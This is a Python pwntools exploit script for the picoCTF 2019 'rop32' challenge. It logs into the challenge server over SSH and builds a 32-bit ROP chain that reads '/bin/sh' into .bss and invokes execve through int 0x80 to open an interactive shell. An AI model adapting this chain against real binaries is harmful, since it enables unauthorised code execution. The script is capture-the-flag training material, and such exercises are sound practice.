#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 2019shell1.picoctf.com --user numin0us --pass  --path /problems/got_4_97e6bb0e913c179989678416d8a8fb22/vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')
context.terminal = ['tmux', 'splitw', '-h'] #GDB splits
#context.log_level = 'DEBUG' #Show network traffic on the wire


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '2019shell1.picoctf.com'
port = int(args.PORT or 22)
user = args.USER or 'numin0us'
password = args.PASSWORD or ''
remote_path = '/problems/rop32_5_890e5a888b8eea67474a6f4abb7ac81d/vuln'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    #shell.set_working_directory(symlink=True)
    shell.set_working_directory(str.encode(os.path.dirname(remote_path)))

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#break *main
#break *main+99
#break *vuln+55
#break *gets
break *0x8049563
#break *win
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()
r = ROP(exe)

payload = cyclic(300)
shellcode = asm(shellcraft.sh())

r.call('gets', [exe.bss()])
#0x08056334 : pop eax ; pop edx ; pop ebx ; ret
r.raw(r.find_gadget(["pop eax", "pop edx", "pop ebx", "ret"]))
r.raw(p32(0xb))
r.raw(p32(0x0))
r.raw(p32(0xdeadbeef))
##0x0806ee92 : pop ecx ; pop ebx ; ret
r.raw(r.find_gadget(["pop ecx", "pop ebx", "ret"]).address)
r.raw(exe.bss()+0x14)
r.raw(exe.bss()+4)
#r.raw(exe.bss()+12)
#r.raw(exe.bss())
#0x08049563 : int 0x80
r.raw(r.find_gadget(["int 0x80"]).address)

print("[*] ROP Payload")
print(r.dump())

payload = fit({28: r.chain()})
io.sendlineafter("Can you ROP your way out of this one?\n",payload)
#io.sendline('/bin/sh\x00{}'.format(p32(exe.bss()+5)))
#0x80db320
#io.sendline('/bin/sh\x00sh\x00\x00\x28\xb3\x0d\x08')


io.sendline('sh\x00\x00/bin///sh\x00\x00\x00\x00\x00\x00\x00\x20\xb3\x0d\x08')
io.interactive()


"""
shellcode = asm(shellcraft.sh())
io = gdb.debug_shellcode(shellcode)
"""


# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

